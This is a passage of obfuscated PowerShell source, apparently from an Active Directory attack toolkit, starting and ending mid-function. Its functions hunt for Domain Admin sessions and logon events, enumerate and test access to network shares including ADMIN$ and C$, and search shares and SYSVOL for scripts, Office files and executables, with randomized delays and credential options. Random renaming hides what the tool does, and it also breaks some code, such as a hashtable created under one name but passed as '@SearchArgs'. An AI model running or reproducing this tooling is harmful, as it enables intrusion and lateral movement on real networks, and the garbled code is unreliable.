                ForEach ($KKbtTlEQY9KtTfJ in $CJ9kiLTwFu9AGol) {
                    Write-Verbose "[*] Querying domain $KKbtTlEQY9KtTfJ for users of group '$hIqWczrXxNjFAmP'"
                    $UTTmFmFvggDWcqw += confessedly -hIqWczrXxNjFAmP $hIqWczrXxNjFAmP -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv| Foreach-Object {
                        $_.MemberName
                    }
                }
            }

            if ((-not $VnJraNO9NZROVGW) -and ((!$UTTmFmFvggDWcqw) -or ($UTTmFmFvggDWcqw.Count -eq 0))) {
                throw "[!] No users found to search for!"
            }
        }


        $bn9LRoFkAwqTApM = {
            param($kEneZcxTTiuFrPZ, $Ping, $STInHftm9uaqEql, $UTTmFmFvggDWcqw, $ozIEgLP9yBLONTb, $qmPjaAatXLPifFS)


            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ
            }
            if($Up) {


                if($ozIEgLP9yBLONTb -and $qmPjaAatXLPifFS) {
                    $mssOcmqepi9N99R = snowshed -ozIEgLP9yBLONTb $ozIEgLP9yBLONTb -qmPjaAatXLPifFS $qmPjaAatXLPifFS -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -ErrorAction SilentlyContinue
                }
                else {
                    $mssOcmqepi9N99R = snowshed -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -ErrorAction SilentlyContinue
                }

                ForEach ($SX9cIUZNlgUXvEw in $mssOcmqepi9N99R) {

                    if($STInHftm9uaqEql) {
                        $STInHftm9uaqEql.split(",") | ForEach-Object {
                            if ($SX9cIUZNlgUXvEw.ProcessName -match $_) {
                                $SX9cIUZNlgUXvEw
                            }
                        }
                    }

                    elseif ($UTTmFmFvggDWcqw -contains $SX9cIUZNlgUXvEw.User) {
                        $SX9cIUZNlgUXvEw
                    }
                }
            }
        }

    }

    process {

        if($rTpHnnlb99iPjvh) {
            Write-Verbose "Using threading with threads = $rTpHnnlb99iPjvh"


            $RKqdPQDaOeQqZwY = @{
                'Ping' = $(-not $Mt9YASUmJCaBvWu)
                'ProcessName' = $STInHftm9uaqEql
                'TargetUsers' = $UTTmFmFvggDWcqw
                'RemoteUserName' = $ozIEgLP9yBLONTb
                'RemotePassword' = $qmPjaAatXLPifFS
            }


            gamboled -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -wCnzjqnrBF9dvCj $bn9LRoFkAwqTApM -JOSAHQ9v9JGmPBt $RKqdPQDaOeQqZwY
        }

        else {
            if(-not $Mt9YASUmJCaBvWu -and ($kEneZcxTTiuFrPZ.count -ne 1)) {

                $Ping = {param($kEneZcxTTiuFrPZ) if(Test-Connection -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -Count 1 -Quiet -ErrorAction Stop){$kEneZcxTTiuFrPZ}}
                $kEneZcxTTiuFrPZ = gamboled -bybIu9FcWQYFgRT -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -wCnzjqnrBF9dvCj $Ping -rTpHnnlb99iPjvh 100
            }

            Write-Verbose "[*] Total number of active hosts: $($kEneZcxTTiuFrPZ.count)"
            $Y9qMKSVLp9NbaEl = 0

            ForEach ($SiEWnqfdNZWbTmF in $kEneZcxTTiuFrPZ) {

                $Y9qMKSVLp9NbaEl = $Y9qMKSVLp9NbaEl + 1


                Start-Sleep -Seconds $umE9IsWm9kKUGTC.Next((1-$ptfOJoCXzpSnNCJ)*$Delay, (1+$ptfOJoCXzpSnNCJ)*$Delay)

                Write-Verbose "[*] Enumerating server $SiEWnqfdNZWbTmF ($Y9qMKSVLp9NbaEl of $($kEneZcxTTiuFrPZ.count))"
                $txcsRvewcVdZtUk = Invoke-Command -wCnzjqnrBF9dvCj $bn9LRoFkAwqTApM -ArgumentList $SiEWnqfdNZWbTmF, $False, $STInHftm9uaqEql, $UTTmFmFvggDWcqw, $ozIEgLP9yBLONTb, $qmPjaAatXLPifFS
                $txcsRvewcVdZtUk

                if($txcsRvewcVdZtUk -and $IfAbkqth9MjUGBa) {
                    Write-Verbose "[*] Target user/process found, returning early"
                    return
                }
            }
        }

    }
}


function bibs {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $kEneZcxTTiuFrPZ,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $SCQMhcOm9CdDHJg,

        [String]
        $9vRumd9teqLmPVM,

        [String]
        $beLlanRpMptelSU,

        [String]
        $hIqWczrXxNjFAmP = 'Domain Admins',

        [String]
        $uDgMtYjFIQxRGmL,

        [String]
        $IuM9ojehadqRMJF,

        [String]
        $UtmAb9UxgORICN9,

        [String]
        $p9WUcQfw9aClvtF,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $yzapkmRpSGxNBuy,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [Int32]
        $PEAAHJKXG9ImwzJ = 3,

        [Switch]
        $v9rPBuPmcvnoMAe,

        [ValidateRange(1,100)] 
        [Int]
        $rTpHnnlb99iPjvh
    )

    begin {

        if ($PSBoundParameters['Debug']) {
            $LWin9zMVCuE99Q9 = 'Continue'
        }


        $umE9IsWm9kKUGTC = New-Object System.Random

        Write-Verbose "[*] Running bibs"

        if($KKbtTlEQY9KtTfJ) {
            $CJ9kiLTwFu9AGol = @($KKbtTlEQY9KtTfJ)
        }
        elseif($v9rPBuPmcvnoMAe) {

            $CJ9kiLTwFu9AGol = misdirects | ForEach-Object { $_.Name }
        }
        else {

            $CJ9kiLTwFu9AGol = @( (skulked).name )
        }







        if(!$kEneZcxTTiuFrPZ) { 

            if($SCQMhcOm9CdDHJg) {
                $kEneZcxTTiuFrPZ = Get-Content -Path $SCQMhcOm9CdDHJg
            }
            elseif($9vRumd9teqLmPVM -or $beLlanRpMptelSU) {
                [array]$kEneZcxTTiuFrPZ = @()
                ForEach ($KKbtTlEQY9KtTfJ in $CJ9kiLTwFu9AGol) {
                    Write-Verbose "[*] Querying domain $KKbtTlEQY9KtTfJ for hosts"
                    $kEneZcxTTiuFrPZ += Randal -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -DshCfudiWKUrQer $9vRumd9teqLmPVM -GazxKCLDhxrDzgZ $beLlanRpMptelSU
                }
            }
            else {

                [array]$kEneZcxTTiuFrPZ = @()
                ForEach ($KKbtTlEQY9KtTfJ in $CJ9kiLTwFu9AGol) {
                    Write-Verbose "[*] Querying domain $KKbtTlEQY9KtTfJ for domain controllers"
                    $kEneZcxTTiuFrPZ += odometer -LDAP -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv | ForEach-Object { $_.dnshostname}
                }
            }


            $kEneZcxTTiuFrPZ = $kEneZcxTTiuFrPZ | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($kEneZcxTTiuFrPZ.Count) -eq 0) {
                throw "No hosts found!"
            }
        }








        $UTTmFmFvggDWcqw = @()


        if($uDgMtYjFIQxRGmL) {
            Write-Verbose "Querying target server '$uDgMtYjFIQxRGmL' for local users"
            $UTTmFmFvggDWcqw = Brahms $uDgMtYjFIQxRGmL -Okpdr9DpyZPCXBG | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {
                ($_.AccountName).split("/")[1].toLower()
            }  | Where-Object {$_}
        }

        elseif($IuM9ojehadqRMJF) {
            Write-Verbose "[*] Using target user '$IuM9ojehadqRMJF'..."
            $UTTmFmFvggDWcqw = @( $IuM9ojehadqRMJF.ToLower() )
        }

        elseif($yzapkmRpSGxNBuy) {
            $UTTmFmFvggDWcqw = Get-Content -Path $yzapkmRpSGxNBuy | Where-Object {$_}
        }
        elseif($p9WUcQfw9aClvtF -or $UtmAb9UxgORICN9) {
            ForEach ($KKbtTlEQY9KtTfJ in $CJ9kiLTwFu9AGol) {
                Write-Verbose "[*] Querying domain $KKbtTlEQY9KtTfJ for users"
                $UTTmFmFvggDWcqw += Houyhnhnm -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -GazxKCLDhxrDzgZ $p9WUcQfw9aClvtF -DshCfudiWKUrQer $UtmAb9UxgORICN9 | ForEach-Object {
                    $_.samaccountname
                }  | Where-Object {$_}
            }            
        }
        else {
            ForEach ($KKbtTlEQY9KtTfJ in $CJ9kiLTwFu9AGol) {
                Write-Verbose "[*] Querying domain $KKbtTlEQY9KtTfJ for users of group '$hIqWczrXxNjFAmP'"
                $UTTmFmFvggDWcqw += confessedly -hIqWczrXxNjFAmP $hIqWczrXxNjFAmP -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv | Foreach-Object {
                    $_.MemberName
                }
            }
        }

        if (((!$UTTmFmFvggDWcqw) -or ($UTTmFmFvggDWcqw.Count -eq 0))) {
            throw "[!] No users found to search for!"
        }


        $bn9LRoFkAwqTApM = {
            param($kEneZcxTTiuFrPZ, $Ping, $UTTmFmFvggDWcqw, $PEAAHJKXG9ImwzJ)


            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ
            }
            if($Up) {

                Europeans -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -dJ9yyFsNLIUpoOe 'all' -ueJThwehxIOklTF ([DateTime]::Today.AddDays(-$PEAAHJKXG9ImwzJ)) | Where-Object {

                    $UTTmFmFvggDWcqw -contains $_.UserName
                }
            }
        }

    }

    process {

        if($rTpHnnlb99iPjvh) {
            Write-Verbose "Using threading with threads = $rTpHnnlb99iPjvh"


            $RKqdPQDaOeQqZwY = @{
                'Ping' = $(-not $Mt9YASUmJCaBvWu)
                'TargetUsers' = $UTTmFmFvggDWcqw
                'SearchDays' = $PEAAHJKXG9ImwzJ
            }


            gamboled -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -wCnzjqnrBF9dvCj $bn9LRoFkAwqTApM -JOSAHQ9v9JGmPBt $RKqdPQDaOeQqZwY
        }

        else {
            if(-not $Mt9YASUmJCaBvWu -and ($kEneZcxTTiuFrPZ.count -ne 1)) {

                $Ping = {param($kEneZcxTTiuFrPZ) if(Test-Connection -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -Count 1 -Quiet -ErrorAction Stop){$kEneZcxTTiuFrPZ}}
                $kEneZcxTTiuFrPZ = gamboled -bybIu9FcWQYFgRT -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -wCnzjqnrBF9dvCj $Ping -rTpHnnlb99iPjvh 100
            }

            Write-Verbose "[*] Total number of active hosts: $($kEneZcxTTiuFrPZ.count)"
            $Y9qMKSVLp9NbaEl = 0

            ForEach ($SiEWnqfdNZWbTmF in $kEneZcxTTiuFrPZ) {

                $Y9qMKSVLp9NbaEl = $Y9qMKSVLp9NbaEl + 1


                Start-Sleep -Seconds $umE9IsWm9kKUGTC.Next((1-$ptfOJoCXzpSnNCJ)*$Delay, (1+$ptfOJoCXzpSnNCJ)*$Delay)

                Write-Verbose "[*] Enumerating server $SiEWnqfdNZWbTmF ($Y9qMKSVLp9NbaEl of $($kEneZcxTTiuFrPZ.count))"
                Invoke-Command -wCnzjqnrBF9dvCj $bn9LRoFkAwqTApM -ArgumentList $SiEWnqfdNZWbTmF, $(-not $Mt9YASUmJCaBvWu), $UTTmFmFvggDWcqw, $PEAAHJKXG9ImwzJ
            }
        }

    }
}


function shift {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $kEneZcxTTiuFrPZ,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $SCQMhcOm9CdDHJg,

        [String]
        $9vRumd9teqLmPVM,

        [String]
        $beLlanRpMptelSU,

        [Switch]
        $qgsNZggitoinaTA,

        [Switch]
        $wvozslLdqtOA9mq,

        [Switch]
        $u9gBpxHMjojVLvJ,

        [Switch]
        $Mt9YASUmJCaBvWu,

        [Switch]
        $KSfPNSLeNfTchba,

        [Switch]
        $OsyCJxPSGgRUBLU,

        [UInt32]
        $Delay = 0,

        [Double]
        $ptfOJoCXzpSnNCJ = .3,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,
 
        [Switch]
        $v9rPBuPmcvnoMAe,

        [ValidateRange(1,100)] 
        [Int]
        $rTpHnnlb99iPjvh
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $LWin9zMVCuE99Q9 = 'Continue'
        }


        $umE9IsWm9kKUGTC = New-Object System.Random

        Write-Verbose "[*] Running shift with delay of $Delay"


        [String[]] $wpdIFNSLvYnIaEm = @('')

        if ($wvozslLdqtOA9mq) {
            $wpdIFNSLvYnIaEm = $wpdIFNSLvYnIaEm + "PRINT$"
        }
        if ($u9gBpxHMjojVLvJ) {
            $wpdIFNSLvYnIaEm = $wpdIFNSLvYnIaEm + "IPC$"
        }
        if ($qgsNZggitoinaTA) {
            $wpdIFNSLvYnIaEm = @('', "ADMIN$", "IPC$", "C$", "PRINT$")
        }


        if($SCQMhcOm9CdDHJg) {
            $kEneZcxTTiuFrPZ = Get-Content -Path $SCQMhcOm9CdDHJg
        }

        if(!$kEneZcxTTiuFrPZ) { 
            [array]$kEneZcxTTiuFrPZ = @()

            if($KKbtTlEQY9KtTfJ) {
                $CJ9kiLTwFu9AGol = @($KKbtTlEQY9KtTfJ)
            }
            elseif($v9rPBuPmcvnoMAe) {

                $CJ9kiLTwFu9AGol = misdirects | ForEach-Object { $_.Name }
            }
            else {

                $CJ9kiLTwFu9AGol = @( (skulked).name )
            }
                
            ForEach ($KKbtTlEQY9KtTfJ in $CJ9kiLTwFu9AGol) {
                Write-Verbose "[*] Querying domain $KKbtTlEQY9KtTfJ for hosts"
                $kEneZcxTTiuFrPZ += Randal -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -DshCfudiWKUrQer $9vRumd9teqLmPVM -GazxKCLDhxrDzgZ $beLlanRpMptelSU
            }
        

            $kEneZcxTTiuFrPZ = $kEneZcxTTiuFrPZ | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($kEneZcxTTiuFrPZ.count) -eq 0) {
                throw "No hosts found!"
            }
        }


        $bn9LRoFkAwqTApM = {
            param($kEneZcxTTiuFrPZ, $Ping, $KSfPNSLeNfTchba, $wpdIFNSLvYnIaEm, $OsyCJxPSGgRUBLU)


            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ
            }
            if($Up) {

                $cvydEClOvNBRNcD = liberation -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ
                ForEach ($Share in $cvydEClOvNBRNcD) {
                    Write-Debug "[*] Server share: $Share"
                    $DWfuTCRFdAZo9TC = $Share.shi1_netname
                    $kijaCDCMlLgNjai = $Share.shi1_remark
                    $Path = '\\'+$kEneZcxTTiuFrPZ+'\'+$DWfuTCRFdAZo9TC


                    if (($DWfuTCRFdAZo9TC) -and ($DWfuTCRFdAZo9TC.trim() -ne '')) {

                        if($OsyCJxPSGgRUBLU) {
                            if($DWfuTCRFdAZo9TC.ToUpper() -eq "ADMIN$") {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    "\\$kEneZcxTTiuFrPZ\$DWfuTCRFdAZo9TC `t- $kijaCDCMlLgNjai"
                                }
                                catch {
                                    Write-Debug "Error accessing path $Path : $_"
                                }
                            }
                        }

                        elseif ($wpdIFNSLvYnIaEm -NotContains $DWfuTCRFdAZo9TC.ToUpper()) {

                            if($KSfPNSLeNfTchba) {

                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    "\\$kEneZcxTTiuFrPZ\$DWfuTCRFdAZo9TC `t- $kijaCDCMlLgNjai"
                                }
                                catch {
                                    Write-Debug "Error accessing path $Path : $_"
                                }
                            }
                            else {
                                "\\$kEneZcxTTiuFrPZ\$DWfuTCRFdAZo9TC `t- $kijaCDCMlLgNjai"
                            }
                        }
                    }
                }
            }
        }

    }

    process {

        if($rTpHnnlb99iPjvh) {
            Write-Verbose "Using threading with threads = $rTpHnnlb99iPjvh"


            $RKqdPQDaOeQqZwY = @{
                'Ping' = $(-not $Mt9YASUmJCaBvWu)
                'CheckShareAccess' = $KSfPNSLeNfTchba
                'ExcludedShares' = $wpdIFNSLvYnIaEm
                'CheckAdmin' = $OsyCJxPSGgRUBLU
            }


            gamboled -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -wCnzjqnrBF9dvCj $bn9LRoFkAwqTApM -JOSAHQ9v9JGmPBt $RKqdPQDaOeQqZwY
        }

        else {
            if(-not $Mt9YASUmJCaBvWu -and ($kEneZcxTTiuFrPZ.count -ne 1)) {

                $Ping = {param($kEneZcxTTiuFrPZ) if(Test-Connection -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -Count 1 -Quiet -ErrorAction Stop){$kEneZcxTTiuFrPZ}}
                $kEneZcxTTiuFrPZ = gamboled -bybIu9FcWQYFgRT -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -wCnzjqnrBF9dvCj $Ping -rTpHnnlb99iPjvh 100
            }

            Write-Verbose "[*] Total number of active hosts: $($kEneZcxTTiuFrPZ.count)"
            $Y9qMKSVLp9NbaEl = 0

            ForEach ($SiEWnqfdNZWbTmF in $kEneZcxTTiuFrPZ) {

                $Y9qMKSVLp9NbaEl = $Y9qMKSVLp9NbaEl + 1


                Start-Sleep -Seconds $umE9IsWm9kKUGTC.Next((1-$ptfOJoCXzpSnNCJ)*$Delay, (1+$ptfOJoCXzpSnNCJ)*$Delay)

                Write-Verbose "[*] Enumerating server $SiEWnqfdNZWbTmF ($Y9qMKSVLp9NbaEl of $($kEneZcxTTiuFrPZ.count))"
                Invoke-Command -wCnzjqnrBF9dvCj $bn9LRoFkAwqTApM -ArgumentList $SiEWnqfdNZWbTmF, $False, $KSfPNSLeNfTchba, $wpdIFNSLvYnIaEm, $OsyCJxPSGgRUBLU
            }
        }
        
    }
}


function Claire {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $kEneZcxTTiuFrPZ,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $SCQMhcOm9CdDHJg,

        [String]
        $9vRumd9teqLmPVM,

        [String]
        $beLlanRpMptelSU,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $QJSOJ9Wvelpbgfr,

        [Switch]
        $riCBkWMeCacicWG,

        [Switch]
        $FhVGYZdNhIhylqU,

        [String[]]
        $Terms,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $KTyNCtJJWJPRZbZ,

        [String]
        $yKEKDEW9PeJTjYe,

        [String]
        $xowyxDubqhcQHpm,

        [String]
        $RoTJ99UvZI9HsRv,

        [Switch]
        $btbGwqqap9BCXOS,

        [Switch]
        $fd9Eo9PbFk9H9Go,

        [Switch]
        $c9dVYer9XyZIDWI,

        [Switch]
        $BXdeapZeYZBWfuJ,

        [Switch]
        $fsGmbzVQbOienMv,

        [String]
        $piSVdrubQFOiYrj,

        [Switch]
        $n9ASL9GgkDycByX,

        [Switch]
        $Mt9YASUmJCaBvWu,

        [UInt32]
        $Delay = 0,

        [Double]
        $ptfOJoCXzpSnNCJ = .3,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,
        
        [Switch]
        $v9rPBuPmcvnoMAe,

        [Switch]
        $rBlbJzgbyWp9aBl,

        [ValidateRange(1,100)] 
        [Int]
        $rTpHnnlb99iPjvh,

        [Switch]
        $9MCpeEay99VfrvP,

        [System.Management.Automation.PSCredential]
        $zbH9gtWqoSKXB9I = [System.Management.Automation.PSCredential]::Empty
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $LWin9zMVCuE99Q9 = 'Continue'
        }


        $umE9IsWm9kKUGTC = New-Object System.Random

        Write-Verbose "[*] Running Claire with delay of $Delay"

        $cvydEClOvNBRNcD = @()


        [String[]] $wpdIFNSLvYnIaEm = @("C$", "ADMIN$")


        if ($btbGwqqap9BCXOS) {
            if ($fd9Eo9PbFk9H9Go) {
                $wpdIFNSLvYnIaEm = @()
            }
            else {
                $wpdIFNSLvYnIaEm = @("ADMIN$")
            }
        }

        if ($fd9Eo9PbFk9H9Go) {
            if ($btbGwqqap9BCXOS) {
                $wpdIFNSLvYnIaEm = @()
            }
            else {
                $wpdIFNSLvYnIaEm = @("C$")
            }
        }


        if(!$n9ASL9GgkDycByX) {
            if ($piSVdrubQFOiYrj -and (Test-Path -Path $piSVdrubQFOiYrj)) { Remove-Item -Path $piSVdrubQFOiYrj }
        }


        if ($KTyNCtJJWJPRZbZ) {
            ForEach ($Term in Get-Content -Path $KTyNCtJJWJPRZbZ) {
                if (($Term -ne $Null) -and ($Term.trim() -ne '')) {
                    $Terms += $Term
                }
            }
        }


        if($QJSOJ9Wvelpbgfr) {
            ForEach ($Item in Get-Content -Path $QJSOJ9Wvelpbgfr) {
                if (($Item -ne $Null) -and ($Item.trim() -ne '')) {

                    $Share = $Item.Split("`t")[0]
                    $cvydEClOvNBRNcD += $Share
                }
            }
        }
        else {

            if($SCQMhcOm9CdDHJg) {
                $kEneZcxTTiuFrPZ = Get-Content -Path $SCQMhcOm9CdDHJg
            }

            if(!$kEneZcxTTiuFrPZ) {

                if($KKbtTlEQY9KtTfJ) {
                    $CJ9kiLTwFu9AGol = @($KKbtTlEQY9KtTfJ)
                }
                elseif($v9rPBuPmcvnoMAe) {

                    $CJ9kiLTwFu9AGol = misdirects | ForEach-Object { $_.Name }
                }
                else {

                    $CJ9kiLTwFu9AGol = @( (skulked).name )
                }

                if($rBlbJzgbyWp9aBl) {
                    ForEach ($KKbtTlEQY9KtTfJ in $CJ9kiLTwFu9AGol) {
                        $99nCbQ99oBoeEVm = "\\$KKbtTlEQY9KtTfJ\SYSVOL\"
                        Write-Verbose "[*] Adding share search path $99nCbQ99oBoeEVm"
                        $cvydEClOvNBRNcD += $99nCbQ99oBoeEVm
                    }
                    if(!$Terms) {

                        $Terms = @('.vbs', '.bat', '.ps1')
                    }
                }
                else {
                    [array]$kEneZcxTTiuFrPZ = @()

                    ForEach ($KKbtTlEQY9KtTfJ in $CJ9kiLTwFu9AGol) {
                        Write-Verbose "[*] Querying domain $KKbtTlEQY9KtTfJ for hosts"
                        $kEneZcxTTiuFrPZ += Randal -DshCfudiWKUrQer $9vRumd9teqLmPVM -GazxKCLDhxrDzgZ $beLlanRpMptelSU -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv
                    }


                    $kEneZcxTTiuFrPZ = $kEneZcxTTiuFrPZ | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
                    if($($kEneZcxTTiuFrPZ.Count) -eq 0) {
                        throw "No hosts found!"
                    }
                }
            }
        }


        $bn9LRoFkAwqTApM = {
            param($kEneZcxTTiuFrPZ, $Ping, $wpdIFNSLvYnIaEm, $Terms, $c9dVYer9XyZIDWI, $riCBkWMeCacicWG, $BXdeapZeYZBWfuJ, $FhVGYZdNhIhylqU, $fsGmbzVQbOienMv, $piSVdrubQFOiYrj, $9MCpeEay99VfrvP, $zbH9gtWqoSKXB9I)

            Write-Verbose "ComputerName: $kEneZcxTTiuFrPZ"
            Write-Verbose "ExcludedShares: $wpdIFNSLvYnIaEm"
            $eT9ltTR9OA9sORm = @()

            if($kEneZcxTTiuFrPZ.StartsWith("\\")) {

                $eT9ltTR9OA9sORm += $kEneZcxTTiuFrPZ
            }
            else {

                $Up = $True
                if($Ping) {
                    $Up = Test-Connection -Count 1 -Quiet -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ
                }
                if($Up) {

                    $cvydEClOvNBRNcD = liberation -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ
                    ForEach ($Share in $cvydEClOvNBRNcD) {

                        $DWfuTCRFdAZo9TC = $Share.shi1_netname
                        $Path = '\\'+$kEneZcxTTiuFrPZ+'\'+$DWfuTCRFdAZo9TC


                        if (($DWfuTCRFdAZo9TC) -and ($DWfuTCRFdAZo9TC.trim() -ne '')) {


                            if ($wpdIFNSLvYnIaEm -NotContains $DWfuTCRFdAZo9TC.ToUpper()) {

                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $eT9ltTR9OA9sORm += $Path
                                }
                                catch {
                                    Write-Debug "[!] No access to $Path"
                                }
                            }
                        }
                    }
                }
            }

            ForEach($Share in $eT9ltTR9OA9sORm) {
                $WetgmKRSgytEcQw =  @{
                    'Path' = $Share
                    'Terms' = $Terms
                    'OfficeDocs' = $riCBkWMeCacicWG
                    'FreshEXEs' = $FhVGYZdNhIhylqU
                    'LastAccessTime' = $yKEKDEW9PeJTjYe
                    'LastWriteTime' = $xowyxDubqhcQHpm
                    'CreationTime' = $RoTJ99UvZI9HsRv
                    'ExcludeFolders' = $c9dVYer9XyZIDWI
                    'ExcludeHidden' = $BXdeapZeYZBWfuJ
                    'CheckWriteAccess' = $fsGmbzVQbOienMv
                    'OutFile' = $piSVdrubQFOiYrj
                    'UsePSDrive' = $9MCpeEay99VfrvP
                    'Credential' = $zbH9gtWqoSKXB9I
                }

                gaff @SearchArgs
            }
        }
    }

    process {

        if($rTpHnnlb99iPjvh) {
            Write-Verbose "Using threading with threads = $rTpHnnlb99iPjvh"


            $RKqdPQDaOeQqZwY = @{
                'Ping' = $(-not $Mt9YASUmJCaBvWu)
                'ExcludedShares' = $wpdIFNSLvYnIaEm
                'Terms' = $Terms
                'ExcludeFolders' = $c9dVYer9XyZIDWI
                'OfficeDocs' = $riCBkWMeCacicWG
                'ExcludeHidden' = $BXdeapZeYZBWfuJ
                'FreshEXEs' = $FhVGYZdNhIhylqU
                'CheckWriteAccess' = $fsGmbzVQbOienMv
                'OutFile' = $piSVdrubQFOiYrj
                'UsePSDrive' = $9MCpeEay99VfrvP
                'Credential' = $zbH9gtWqoSKXB9I
            }


            if($cvydEClOvNBRNcD) {

                gamboled -kEneZcxTTiuFrPZ $cvydEClOvNBRNcD -wCnzjqnrBF9dvCj $bn9LRoFkAwqTApM -JOSAHQ9v9JGmPBt $RKqdPQDaOeQqZwY
            }
            else {
                gamboled -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -wCnzjqnrBF9dvCj $bn9LRoFkAwqTApM -JOSAHQ9v9JGmPBt $RKqdPQDaOeQqZwY
            }        
        }

        else {
            if($cvydEClOvNBRNcD){
                $kEneZcxTTiuFrPZ = $cvydEClOvNBRNcD
            }
            elseif(-not $Mt9YASUmJCaBvWu -and ($kEneZcxTTiuFrPZ.count -gt 1)) {

                $Ping = {param($kEneZcxTTiuFrPZ) if(Test-Connection -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -Count 1 -Quiet -ErrorAction Stop){$kEneZcxTTiuFrPZ}}
                $kEneZcxTTiuFrPZ = gamboled -bybIu9FcWQYFgRT -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -wCnzjqnrBF9dvCj $Ping -rTpHnnlb99iPjvh 100
            }

            Write-Verbose "[*] Total number of active hosts: $($kEneZcxTTiuFrPZ.count)"
            $Y9qMKSVLp9NbaEl = 0

            $kEneZcxTTiuFrPZ | Where-Object {$_} | ForEach-Object {
                Write-Verbose "Computer: $_"
                $Y9qMKSVLp9NbaEl = $Y9qMKSVLp9NbaEl + 1


                Start-Sleep -Seconds $umE9IsWm9kKUGTC.Next((1-$ptfOJoCXzpSnNCJ)*$Delay, (1+$ptfOJoCXzpSnNCJ)*$Delay)

                Write-Verbose "[*] Enumerating server $_ ($Y9qMKSVLp9NbaEl of $($kEneZcxTTiuFrPZ.count))"

                Invoke-Command -wCnzjqnrBF9dvCj $bn9LRoFkAwqTApM -ArgumentList $_, $False, $wpdIFNSLvYnIaEm, $Terms, $c9dVYer9XyZIDWI, $riCBkWMeCacicWG, $BXdeapZeYZBWfuJ, $FhVGYZdNhIhylqU, $fsGmbzVQbOienMv, $piSVdrubQFOiYrj, $9MCpeEay99VfrvP, $zbH9gtWqoSKXB9I                
            }
        }
    }
}


function fuller {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $kEneZcxTTiuFrPZ,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $SCQMhcOm9CdDHJg,

        [String]
        $9vRumd9teqLmPVM,

        [String]
        $beLlanRpMptelSU,

        [Switch]
        $Mt9YASUmJCaBvWu,

        [UInt32]
        $Delay = 0,

        [Double]
        $ptfOJoCXzpSnNCJ = .3,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [Switch]
        $v9rPBuPmcvnoMAe,

        [ValidateRange(1,100)] 
        [Int]
        $rTpHnnlb99iPjvh
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $LWin9zMVCuE99Q9 = 'Continue'
        }


        $umE9IsWm9kKUGTC = New-Object System.Random

        Write-Verbose "[*] Running fuller with delay of $Delay"


        if($SCQMhcOm9CdDHJg) {
